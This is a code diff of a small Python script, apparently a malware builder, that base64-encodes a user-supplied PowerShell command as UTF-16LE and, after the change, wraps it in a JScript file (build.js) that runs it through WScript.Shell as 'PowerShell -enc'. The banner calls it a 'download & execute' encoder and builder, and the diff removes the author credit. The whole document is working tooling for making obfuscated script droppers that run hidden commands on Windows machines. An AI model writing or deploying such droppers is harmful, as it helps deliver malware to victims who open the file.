@@ -1,20 +1,20 @@
 import base64
 
-print('## powershell obfuscation encoder                           ##')
+print('## powershell download & execute , Encoder + Builder        ##')
 print('## Note: This is not a normal base64 encoder!               ##')
 print('## It converts the string to UTF-16LE first before encoding ##')
 print('## as that is what PowerShell expects!                      ##')
-print('## Coded by Joel Ossi                                       ##')
+print('')
 
-file=open('output.txt','w')
+file=open('build.js','w')
 
 code = raw_input('INVOKEN STRING TO ENCODE: ')
 print('')
 shellcode = base64.b64encode(code.encode('UTF-16-LE'))
 print (shellcode)
 print('')
-file.write("powershell.exe -enc " + shellcode)
+file.write("var run=new ActiveXObject('WSCRIPT.Shell').Run('PowerShell -enc " + shellcode + "');")
 file.close()
-print('[+] Powershell Code Generated, use the output code and replace it in the JS Downloader.')
-print('[+] Output Saved.')
+print('[+] String Encoded.')
+print('[+] Build Saved.')
 raw_input('')
